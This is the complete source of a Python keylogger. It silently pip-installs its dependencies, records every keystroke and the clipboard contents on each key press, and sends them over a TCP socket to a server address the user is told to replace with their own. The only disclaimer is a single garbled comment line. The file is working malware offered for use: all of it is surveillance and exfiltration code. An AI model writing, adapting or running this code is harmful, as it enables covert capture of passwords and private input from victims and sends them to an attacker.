#!/usr/bin/python3
# Note:
# This script is only for ethical and Unauthorized use of keyloggers is illegal.

try:
    import socket
    import threading
    from pynput import keyboard
    from pandas import read_clipboard
    from os import system
except ImportError:
    from os import system
    system('pip install -q pynput')
    system('pip install -q pandas')
    import socket
    import threading
    from pynput import keyboard
    from pandas import read_clipboard

# Initializing global values
# Replace with your server's IP address
SERVER_ADDRESS = ("127.0.0.1", 8080)

class Keylogger:
    def __init__(self):
        self.server_address = SERVER_ADDRESS

    def send_data(self, data):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect(self.server_address)
            server.sendall(data.encode())
            server.close()
        except Exception as e:
            print(f"Failed to send data: {e}")

    def on_key_press(self, key):
        try:
            # Fetch clipboard data
            try:
                clipboard_data = read_clipboard().to_string(index=False)
            except Exception:
                clipboard_data = "Failed to fetch clipboard data"

            # Log keystrokes
            key_data = f"Keystroke: {key}\nClipboard data: {clipboard_data}\n"
            self.send_data(key_data)
        except Exception as e:
            print(f"Error logging key: {e}")

    def start(self):
        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger.start, daemon=True)
    keylogger_thread.start()
    keylogger_thread.join()
